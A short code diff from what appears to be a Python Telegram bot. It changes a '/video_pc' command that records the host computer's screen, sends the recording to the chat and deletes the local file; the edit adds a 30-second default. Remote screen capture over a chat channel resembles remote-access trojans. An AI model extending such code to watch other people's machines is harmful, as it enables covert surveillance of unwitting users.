@@ -78,7 +78,8 @@ def handle_message(msg):
             os.remove(path)
 
         elif command.startswith('/video_pc'):
-            seconds = min(int(command.replace('/video_pc', '').strip()), 500)
+            parts = command.replace('/video_pc', '').strip()
+            seconds = min(int(parts) if parts else 30, 500)
             path, response = record_screen(seconds)
             bot.sendDocument(chat_id, open(path, 'rb'))
             os.remove(path)
